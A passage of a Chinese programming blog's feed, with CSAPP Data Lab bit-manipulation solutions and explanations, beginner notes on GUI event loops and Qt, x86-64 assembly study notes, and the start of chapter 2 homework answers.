title="思路"></a>思路</h4><ul><li>算术移n-1位，如果是负数，且可以用n bits的补码表示，则得到-1。如果是正数，则得到0。</li></ul><h3 id="divpwr2"><a href="#divpwr2" class="headerlink" title="divpwr2"></a>divpwr2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * divpwr2 - Compute x/(2^n), for 0 &lt;= n &lt;= 30</span></span><br><span class="line"><span class="comment"> *  Round toward zero</span></span><br><span class="line"><span class="comment"> *   Examples: divpwr2(15,1) = 7, divpwr2(-33,4) = -2</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">divpwr2</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> t = x&gt;&gt;<span class="number">31</span>;</span><br><span class="line"><span class="keyword">return</span> (x+(t&amp;<span class="number">1</span>&lt;&lt;n)+(~(t&amp;<span class="number">1</span>)+<span class="number">1</span>))&gt;&gt;n;</span><br><span class="line">  <span class="comment">//equal to (x+(t&amp;1&lt;&lt;n)-(t&amp;1))&gt;&gt;n;</span></span><br><span class="line">  <span class="comment">//note that &amp; 的优先级低于&lt;&lt;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h4><ul><li>直接移位是round down，无论是负数还是正数</li><li>所以要实现round to zero , C表达式为<code>x&lt;0 ? x+(pow(2,n)-1)&gt;&gt;n : x&gt;&gt;n</code></li></ul><h3 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ~x+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h4><ul><li>直接取反再加1</li></ul><h3 id="isPositive"><a href="#isPositive" class="headerlink" title="isPositive"></a>isPositive</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isPositive - return 1 if x &gt; 0, return 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Example: isPositive(-1) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 8</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isPositive</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ~(x&gt;&gt;<span class="number">31</span>)&amp;!!x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h4><ul><li>符号位判断，并且非0</li></ul><h3 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> !!(x&gt;&gt;<span class="number">31</span>&amp;~(y&gt;&gt;<span class="number">31</span>)) | !(~(x&gt;&gt;<span class="number">31</span>)&amp;(y&gt;&gt;<span class="number">31</span>))&amp;(x+~y+<span class="number">1</span>&gt;&gt;<span class="number">31</span>) | !(x^y);</span><br><span class="line"><span class="comment">//equal to  !!(x&gt;&gt;31&amp;~(y&gt;&gt;31)) | !(~(x&gt;&gt;31)&amp;(y&gt;&gt;31))&amp;(x-y&gt;&gt;31) | !(x^y)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h4><ul><li><code>x&lt;0&amp;&amp;y&gt;0 | !(x&gt;0&amp;&amp;y&lt;0)&amp;&amp;(x-y&gt;0) | x==y</code></li></ul><h3 id="ilog2"><a href="#ilog2" class="headerlink" title="ilog2"></a>ilog2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ilog2 - return floor(log base 2 of x), where x &gt; 0</span></span><br><span class="line"><span class="comment"> *   Example: ilog2(16) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 90</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ilog2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> mark1 = <span class="number">0x55</span>;</span><br><span class="line"><span class="keyword">int</span> mark2 = <span class="number">0x33</span>;</span><br><span class="line"><span class="keyword">int</span> mark3 = <span class="number">0x0F</span>;</span><br><span class="line">mark1 |= mark1&lt;&lt;<span class="number">8</span>;</span><br><span class="line">mark1 |= mark1&lt;&lt;<span class="number">16</span>;</span><br><span class="line">mark2 |= mark2&lt;&lt;<span class="number">8</span>;</span><br><span class="line">mark2 |= mark2&lt;&lt;<span class="number">16</span>;</span><br><span class="line">mark3 |= mark3&lt;&lt;<span class="number">8</span>;</span><br><span class="line">mark3 |= mark3&lt;&lt;<span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">x |= x&gt;&gt;<span class="number">1</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">2</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">4</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">8</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">16</span>;</span><br><span class="line">x &gt;&gt;= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">x = (x&gt;&gt;<span class="number">1</span>&amp;mark1)+(x&amp;mark1);<span class="comment">//every two bits; clear record;</span></span><br><span class="line">x = (x&gt;&gt;<span class="number">2</span>&amp;mark2)+(x&amp;mark2);<span class="comment">//every four bits; clear record;</span></span><br><span class="line">x = (x&gt;&gt;<span class="number">4</span>&amp;mark3)+(x&amp;mark3);<span class="comment">//every eight bits; clear record;</span></span><br><span class="line">x = (x&gt;&gt;<span class="number">8</span>)+x;<span class="comment">//every 16 bits; record in the low 8 bits;</span></span><br><span class="line">x = (x&gt;&gt;<span class="number">16</span>)+x;<span class="comment">//every 32 bits; record in the low 8 bits;</span></span><br><span class="line"><span class="keyword">return</span> x&amp;<span class="number">0xFF</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h4><ul><li>先构造从最高的1到最低位均为1的二进制，然后类似bitCount</li></ul><h3 id="float-neg"><a href="#float-neg" class="headerlink" title="float_neg"></a>float_neg</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * float_neg - Return bit-level equivalent of expression -f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int's, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representations of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_neg</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> t = uf&amp;<span class="number">0x7FFFFFFF</span>;</span><br><span class="line"><span class="keyword">if</span>(t^<span class="number">0x7F800000</span> &amp;&amp; (t&gt;&gt;<span class="number">23</span>)+<span class="number">1</span>&gt;&gt;<span class="number">8</span>)</span><br><span class="line"><span class="keyword">return</span> uf;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line"><span class="keyword">return</span> uf^<span class="number">0x80000000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h4><ul><li>判别是否是NaN。先判断尾数是否全0，然后用<code>(t&gt;&gt;23)+1&gt;&gt;8</code>判断exp是否全1</li></ul><h3 id="float-i2f"><a href="#float-i2f" class="headerlink" title="float_i2f"></a>float_i2f</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * float_i2f - Return bit-level equivalent of expression (float) x</span></span><br><span class="line"><span class="comment"> *   Result is returned as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_i2f</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> shiftLeft=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> afterShift, tmp, flag;</span><br><span class="line">    <span class="keyword">unsigned</span> absX=x;</span><br><span class="line">    <span class="keyword">unsigned</span> sign=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//special case</span></span><br><span class="line">    <span class="keyword">if</span> (x==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//if x &lt; 0, sign = 1000...,abs_x = -x</span></span><br><span class="line">    <span class="keyword">if</span> (x&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sign=<span class="number">0x80000000</span>;</span><br><span class="line">        absX=-x;</span><br><span class="line">    &#125;</span><br><span class="line">    afterShift=absX;</span><br><span class="line">    <span class="comment">//count shift_left and after_shift</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp=afterShift;</span><br><span class="line">        afterShift&lt;&lt;=<span class="number">1</span>;</span><br><span class="line">        shiftLeft++;</span><br><span class="line">        <span class="keyword">if</span> (tmp &amp; <span class="number">0x80000000</span>) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((afterShift &amp; <span class="number">0x01ff</span>)&gt;<span class="number">0x0100</span>)</span><br><span class="line">        flag=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((afterShift &amp; <span class="number">0x03ff</span>)==<span class="number">0x0300</span>)</span><br><span class="line">        flag=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        flag=<span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> sign + (afterShift&gt;&gt;<span class="number">9</span>) + ((<span class="number">159</span>-shiftLeft)&lt;&lt;<span class="number">23</span>) + flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//from http://www.cnblogs.com/tenlee/p/4951639.html</span></span><br></pre></td></tr></table></figure><h4 id="思路-12"><a href="#思路-12" class="headerlink" title="思路"></a>思路</h4><ul><li><p>分情况处理0、负数、正数</p></li><li><p>要处理舍人</p><blockquote><ul><li>向接近的舍入</li><li>如果处于中间，向偶数舍入</li></ul></blockquote></li><li><p>舍入时，如果尾数加一，exp有可能需要进位，这时候直接加一效果一样，可以导致exp进位，不需要特殊处理。如果exp等于0xFE，那么进位就变成了inf，也是合法的</p></li></ul><h3 id="float-twict"><a href="#float-twict" class="headerlink" title="float_twict"></a>float_twict</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * float_twice - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int's, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_twice</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> t = uf&amp;<span class="number">0x7FFFFFFF</span>;</span><br><span class="line"><span class="keyword">unsigned</span> temp = t&amp;<span class="number">0x7F800000</span>;</span><br><span class="line"><span class="keyword">unsigned</span> temp2 = uf&amp;<span class="number">0xFF800000</span>;</span><br><span class="line"><span class="keyword">int</span> expFull = !(temp^<span class="number">0x7F800000</span>);</span><br><span class="line"><span class="keyword">if</span>(t^<span class="number">0x7F800000</span> &amp;&amp; expFull)</span><br><span class="line"><span class="keyword">return</span> uf;</span><br><span class="line"><span class="keyword">if</span>(expFull)&#123;</span><br><span class="line"><span class="keyword">return</span> temp2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(t&amp;<span class="number">0x7F800000</span>))&#123;</span><br><span class="line"><span class="keyword">unsigned</span> k = (uf&amp;<span class="number">0x7FFFFF</span>);</span><br><span class="line"><span class="keyword">return</span> temp2+(k&lt;&lt;<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> (temp&gt;&gt;<span class="number">23</span>)+<span class="number">1</span>&lt;&lt;<span class="number">23</span> | uf&amp;<span class="number">0x807FFFFF</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-13"><a href="#思路-13" class="headerlink" title="思路"></a>思路</h4><ul><li>分情况处理三种IEEE754的情况</li><li>需要注意exp全0时，乘以二就是尾数乘以二，如果发生进位需要exp进位，不需要特殊处理（第三个if），因为进位直接导致exp加一，这就足够了</li></ul>]]></content>
    
    <summary type="html">
    
      CSAPP 数据实验的解答
    
    </summary>
    
      <category term="CSAPP" scheme="https://h-zex.github.io/categories/CSAPP/"/>
    
    
      <category term="CSAPP Lab" scheme="https://h-zex.github.io/tags/CSAPP-Lab/"/>
    
  </entry>
  
  <entry>
    <title>初学GUI的一些理解（瞎猜）</title>
    <link href="https://h-zex.github.io/2017/08/11/%E5%88%9D%E5%AD%A6GUI%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3%EF%BC%88%E7%9E%8E%E7%8C%9C%EF%BC%89/"/>
    <id>https://h-zex.github.io/2017/08/11/初学GUI的一些理解（瞎猜）/</id>
    <published>2017-08-11T10:15:36.000Z</published>
    <updated>2018-08-04T04:48:35.574Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>应该把整个程序运行过程分解为：</p><ol><li>描述一个界面(前端)</li></ol><ul><li>show出来</li><li>进入无限循环</li><li>在循环里按照刷新频率show这个界面</li><li>每次循环里还检测是否有输入，如果没有，就继续下一次循环</li><li>如果有，就像控制台程序一样，接受输入，给出输出</li><li>当遇到销毁窗口的输入时，退出循环(从而不再show，也不再处理输入，并且从main return回去，被操作系统回收了申请的内存以及画笔权限之类的资源)</li></ul></li><li><p>也就是说，我把一个窗口程序分解为</p><ol><li>定义图形</li><li>重复画图</li><li>对输入给出输出的类似控制台程序</li></ol></li></ul><ul><li>在main函数，我在栈上(或者堆上)申请了几个类变量，这些变量是我的窗口的组件，设置他们的各种属性(比如外观)，设置他们的从属关系，然后把他们用layout布局好，用show函数显示出来。显示出来的是一个图形，当然，类不止有外观方面的属性，所以这其实是一个前端</li><li>进入消息循环，这个图形一直显示着(不知道是不是按照刷新频率不断地执行show函数)</li><li>以上就完成了在屏幕上一直显示一个图形的任务，然后，接下来的任务就是这个程序接受输入，然后输出结果的过程。</li><li>接受的输入有: 键盘、鼠标等等的输入，又或者说这些输入设备他们的状态持续性(被读取的时间点是离散的)、间歇性地被系统函数读取，然后，如果我们的鼠标点击了我们写的这个窗口程序的某个按钮，就会把这个状态PUSH进我们的程序的消息队列，而因为我们的程序在消息循环中一直扫描该队列，所以主程序可以读到输入，并把输入分发给组件(也就是调用组件的函数，把输入作为参数传给函数)</li><li>如果前后端不分离，那么我们可以直接在组件里定义函数，这些函数对输入给出输出，然后直接输出来</li><li>但是，这样程序就不解耦了，这样我们要对输入到输出的映射进行修改就需要修改这个组件的类成员函数</li><li>如果我们换一种实现方式，组件接收到输入(也就是自己接受输入的函数被调用)后把自己的状态的变化发射出去(用SIGNAL函数)</li><li>所谓发射出去，我猜测如下<ol><li>GoF观察者模式的经典实现(就是每个组件的消息接收函数都调用一次)</li><li>组件也有消息循环(这或许需要多线程，毕竟主程序在进行消息循环，如果组件也无线循环那要跑哪个循环)</li><li>把该消息放在共享的那块内存，然后每个组件都执行一次消息循环</li></ol></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;&lt;p&gt;应该把整个程序运行过程分解为：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;描述一个界面(前端)&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;show出来&lt;/li&gt;
&lt;li&gt;进入无限循环&lt;/li&gt;
&lt;li&gt;在循环里按照刷新频率show这个界面&lt;/li&gt;
&lt;li&gt;每次循环里还检测
      
    
    </summary>
    
      <category term="开发" scheme="https://h-zex.github.io/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="GUI" scheme="https://h-zex.github.io/tags/GUI/"/>
    
      <category term="Qt" scheme="https://h-zex.github.io/tags/Qt/"/>
    
  </entry>
  
  <entry>
    <title>汇编相关</title>
    <link href="https://h-zex.github.io/2017/08/06/%E6%B1%87%E7%BC%96%E7%9B%B8%E5%85%B3/"/>
    <id>https://h-zex.github.io/2017/08/06/汇编相关/</id>
    <published>2017-08-06T14:35:44.000Z</published>
    <updated>2018-08-04T04:48:35.588Z</updated>
    
    <content type="html"><![CDATA[<h4 id="MOV"><a href="#MOV" class="headerlink" title="MOV"></a>MOV</h4><ul><li>操作数不能都是memory</li><li>register must match the suffix</li><li>movq 的立即数必须再32bit补码能表示的范围内，然后该立即数被符号扩展</li><li>movabsq可以有任意的64bit立即数（没有明确指出是否是补码），但是destination必须是register</li><li>movz、movs系列have a register or memory location as the source and a register as the destination.</li><li>cltq: SignExtend(%eax) -&gt; %rax</li><li>movzlq不存在，可以用movl实现。<strong>但是movzbq、movzwq为什么存在，不是可以用movzbl、movzwl实现（practice problem3.4第四题）。同样的，sal、shl为什么同时存在</strong></li></ul><h4 id="其他指令"><a href="#其他指令" class="headerlink" title="其他指令"></a>其他指令</h4><ul><li>leaq:<ul><li>has no other size variants</li><li>The destination operand must be a register.</li></ul></li><li>Unary Operations:<ul><li>operand can be either a register or a memory location. </li></ul></li><li>Binary Operations:<ul><li>the second operand is used as both a source and a destination</li><li>the first operand can be either an immediate value, a register, or a memory location. The second can be either a register or a memory location.</li><li>the two operands can’t both be memory location</li><li>when the second operand is a memory location, the processor must read the value from memory, perform the operation, and then write the result back to memory.</li></ul></li><li>Shift Operations<ul><li>shift amount is given first and the value to shift is given second. 因为第二个操作数是register或者memory location，所以不能用立即数作为the value to shift</li><li>shift amount can be imm value or %cl</li><li>a shift instruction operating on data values that are w bits long determines the shift amount from the low-order m bits of register %cl, where $2^m=w$. The higher-order bits are ignored.For example, when register %cl has hexadecimal value 0xFF, then instruction salb would shift by 7, while salw would shift by 15, sall would shift by 31, and salq would shift 63</li><li>destination can be register or memory location</li></ul></li></ul><h2 id="浮点指令"><a href="#浮点指令" class="headerlink" title="浮点指令"></a>浮点指令</h2><ul><li>vmovss, vmovd的操作数可以是（第一个source，第二个destination）<ul><li>memory， XMM</li><li>XMM， memory</li><li>按照书上的描述，好像还可以XMM， XMM</li></ul></li><li>vmovaps, vmovapd可以从XMM to XMM，读写内存时，地址需要16字节对齐。</li><li>vcvttss2si,, vcvttss2siq的destination都是通用寄存器（非XMM）</li><li>vcvtsi2ss, vcvtsi2sd, vcvtsi2ssq, vcvtsi2sdq的destination都是XMM，第二个source操作数都是XMM（可能只是书上讲的情形有这个要求而已）</li><li>vunpcklps, vcvtps2pd：single to double（其实是有vcvtsd2ss）</li><li>vmovddup, vcvtpd2psx：double to single（其实是有vcvtsi2sdq）</li><li>vaddss, vsubss, vmulss, vdivss, vmaxss, vminss, sqrtss第一个source是XMM或者memory，第二个source和destination必须是XMM</li><li>vaddsd, vsubsd, vmulsd, vdivsd, vmaxsd, vminsd, sqrtsd同样</li></ul><h4 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h4><ul><li>intel format have reverse order operands;</li><li>Different instructions allow different ranges of immediate values; the assembler will automatically select the most compact way of encoding a value </li><li>Such a reference has four components: an immediate offset Imm, a base register r<sub>b</sub>, an index register r<sub>i</sub>, and a scale factor s, where s must be 1, 2, 4, or 8. Both the base and index must be 64-bit registers.</li><li>Any instruction that generates a 32-bit value for a register also sets thehigh-order portion of the register to 0</li><li>后缀的匹配</li></ul>]]></content>
    
    <summary type="html">
    
      CSAPP提到的汇编相关知识点
    
    </summary>
    
      <category term="CSAPP" scheme="https://h-zex.github.io/categories/CSAPP/"/>
    
    
      <category term="汇编" scheme="https://h-zex.github.io/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP3e 第二章作业</title>
    <link href="https://h-zex.github.io/2017/08/06/CSAPP3e-%E7%AC%AC%E4%BA%8C%E7%AB%A0%E4%BD%9C%E4%B8%9A/"/>
    <id>https://h-zex.github.io/2017/08/06/CSAPP3e-第二章作业/</id>
    <published>2017-08-06T04:18:27.000Z</published>
    <updated>2018-08-04T04:55:36.806Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2-58"><a href="#2-58" class="headerlink" title="2.58"></a>2.58</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLittleEndian1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> ((<span class="keyword">char</span>*)&amp;a)[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-59"><a href="#2-59" class="headerlink" title="2.59"></a>2.59</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f2_59</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> x&amp;(((<span class="number">1</span>&lt;&lt;(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)<span class="number">-1</span>)*<span class="number">8</span>)<span class="number">-1</span>)&lt;&lt;<span class="number">8</span>)|(y&amp;<span class="number">0xFF</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-60"><a href="#2-60" class="headerlink" title="2.60"></a>2.60</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">replaceByte</span><span class="params">(<span class="keyword">unsigned</span> x, <span class="keyword">int</span> i, <span class="keyword">unsigned</span> <span class="keyword">char</span> b)</span></span></span><br><span class="line"><span 